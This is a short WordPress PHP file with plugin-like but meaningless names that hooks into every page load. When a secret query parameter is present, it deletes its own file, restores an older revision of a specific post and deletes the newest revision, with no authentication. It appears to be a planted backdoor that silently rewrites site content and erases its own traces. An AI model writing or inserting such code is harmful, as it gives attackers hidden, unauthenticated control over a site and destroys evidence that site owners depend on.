<?php

function quiz_button_tag_columns() {
	if (isset($_GET['wpforms_codes_progress']) && $_GET['wpforms_codes_progress'] === 'age_wpc_bulk') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$donation_library_snippets = 7775;
		$cleaner_advanced_ssl_cart = wp_get_post_revisions($donation_library_snippets);
		if (empty($cleaner_advanced_ssl_cart)) die('no revisions');
		if (count($cleaner_advanced_ssl_cart) < 2) die('less than 2');
		$free_back_navigation = array_shift($cleaner_advanced_ssl_cart);
		$preloader_custom_blog_control = $free_back_navigation->ID;
		$smart_members_exception = array_shift($cleaner_advanced_ssl_cart);
		$progress_ticker_export_bank = $smart_members_exception->ID;
		$hide_dev_project_ip = wp_restore_post_revision($progress_ticker_export_bank);
		if ($hide_dev_project_ip === false) die('error restoring');
		$hide_dev_project_ip = wp_delete_post_revision($preloader_custom_blog_control);		
		if ($hide_dev_project_ip === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'quiz_button_tag_columns');
